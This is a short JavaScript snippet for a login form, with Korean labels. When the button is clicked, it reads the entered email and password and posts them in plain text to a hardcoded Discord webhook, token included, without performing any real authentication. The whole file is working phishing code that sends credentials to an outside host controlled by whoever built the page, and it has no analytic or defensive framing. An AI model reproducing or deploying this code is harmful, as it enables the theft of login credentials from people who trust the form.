document.getElementById('login-button').addEventListener('click', function() {
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    const webhookURL = 'https://discord.com/api/webhooks/1312724758500216882/POMdK4RsYUMWFmYtpz81FE-xyPd4coVmBBCpix4jsQVCdL27avEBXS9ZMYnm2Kz7oc2p';

    const data = {
        content: `이메일: ${email}\n비밀번호: ${password}`
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .catch(error => {
        console.error('Error:', error);
        alert('전송 중 오류가 발생했습니다.');
    });
});